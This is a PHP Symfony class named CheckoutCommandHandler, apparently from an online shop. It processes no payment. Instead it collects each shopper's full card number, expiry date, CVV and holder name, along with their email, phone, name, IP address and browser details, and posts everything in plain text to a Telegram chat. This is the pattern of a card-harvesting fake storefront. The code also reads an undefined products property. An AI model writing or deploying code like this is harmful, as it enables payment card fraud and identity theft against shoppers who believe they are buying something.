<?php

declare(strict_types=1);

namespace App\Integration\Application\UseCase\Checkout;

use App\Cart\Domain\Service\CartService;
use Symfony\Component\Notifier\Bridge\Telegram\TelegramOptions;
use Symfony\Component\Notifier\ChatterInterface;
use Symfony\Component\Notifier\Message\ChatMessage;

final readonly class CheckoutCommandHandler
{
    public function __construct(
        private CartService      $cartService,
        private ChatterInterface $chatter,
    )
    {
    }

    public function handle(CheckoutCommand $checkoutCommand): void
    {
        $cart = $this->cartService->getCart();

        if (empty($cart)) {
            throw new \DomainException('Cart is empty');
        }

        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_REAL_IP'] ?? $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];

        $message = "New order received:\n";

        foreach ($cart as $productId => $quantity) {
            $productName = $this->products[$productId]['name'] ?? $productId;
            $message .= "$productName: $quantity\n";
        }

        $message .= "-----\n" .
            "Card data:\n" .
            "Number: $checkoutCommand->cardNumber\n" .
            "Expired at: $checkoutCommand->cardExpiryMonth/$checkoutCommand->cardExpiryYear\n" .
            "CVV: $checkoutCommand->cardCvv\n" .
            "Holder name: $checkoutCommand->cardHolderName\n";
        $message .= "-----\n" .
            "Email: $checkoutCommand->email\n" .
            "Phone: $checkoutCommand->phone\n" .
            "First name: $checkoutCommand->firstName\n" .
            "Last name: $checkoutCommand->lastName\n";
        $message .= "-----\n" .
            "IP: $ip\n" .
            "User-Agent: $userAgent";

        $chatMessage = new ChatMessage($message);
        $telegramOptions = new TelegramOptions()->parseMode(TelegramOptions::PARSE_MODE_HTML);
        $chatMessage->options($telegramOptions);

        try {
            $this->chatter->send($chatMessage);
            $this->cartService->clearCart();

            return;
        } catch (\Throwable $e) {
            throw new \RuntimeException('Error during checkout: ' . $e->getMessage());
        }
    }
}
